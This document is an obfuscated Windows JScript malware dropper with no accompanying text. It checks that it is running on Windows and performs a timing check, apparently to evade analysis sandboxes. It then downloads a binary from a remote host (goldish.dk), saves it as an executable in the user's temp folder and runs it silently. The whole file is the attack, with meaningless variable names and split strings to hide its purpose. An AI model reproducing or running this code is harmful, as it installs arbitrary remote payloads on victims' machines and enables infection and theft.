var _SO = false;
var _G0 = "CreateObject";
var _NM = function _LO() {return WScript[_G0]("WScript"+".Shell");}(), _CE0 = 11;
var _Q0 = "MSXML2.XMLHTTP";
var _ZP = 2123213;
var _F0 = 0;
function _NQ(_B0){_NM["Run"](_B0, _F0, _F0);};
function _Q(){return _Q0 + "";};
function _A(_H, _B1){_F0 = _F0 * 1; return _H - _B1;};
function _X(){return _G0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _SO = true;
  @end
@*/
if (_SO)
{
var _JA = "";
function _ET(){return 22;};
var _W = 0; var _BH = 0;
function _F()
{
var _BR = new this["Date"]();
var _V = _BR["getUTCMilliseconds"]();
WScript["Sleep"](_ET());
var _BR = new this["Date"]();
var _PQ = _BR["getUTCMilliseconds"]();
WScript["Sleep"](_ET());
var _BR = new this["Date"]();
var _ZW = _BR["getUTCMilliseconds"]();
var _W = "_E";
_W = _A(_PQ, _V);
var _BH = "_JH";
_BH = _A(_ZW, _PQ);
_JA = "open";
return _A(_W, _BH);
}
var _TU = false;
var _II = false;
for (var _B = _F0; _B < _ET() * 1; _B++){if (_F() != _F0){
_TU = true; 
_BH = "31" + 11 * _W + _BH; 
_II = true; 
break;
}}
function _CE() {return ((_TU == true) && (_TU == _II)) ? 1 : _F0;};
if (_TU && _CE() && _II){
function _UV() {return _NM["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "qii83To7p2YDm.ex" + "e";};
 _M0 = _Q();
 _MK = WScript[_G0](_M0);
 var _A0 = 1;
 while (_A0){
try {
	if (_A0 == 1)
	{
		_MK[_JA]("GET", "http://goldish.dk/o2pds", false);
		_MK["send"]();
		_A1 = "Sleep";
	}
	WScript[_A1](_ET() + 120); 
	if (_MK["readystate"] < 2 * 2) continue;
	_A0 = _F0;
	function _KJ(_D) {var _M = (1, 2, 3, 4, 5, _D); return _M;};
	_V0 = WScript[_X()]("ADODB.Stream");
	_M0 = _V0;
	_M0[_JA]();
	_M0["type"] = _KJ(1);
	_M0["write"](_MK["ResponseBody"]);
	_V0["position"] = _KJ(_F0);
	_M0["Save" + "ToFile"](_UV(), 2);
	_V0["cl"+"ose"]();
	_G = _UV();
	_NQ(_G);
} catch(_G1){};
}
}
}

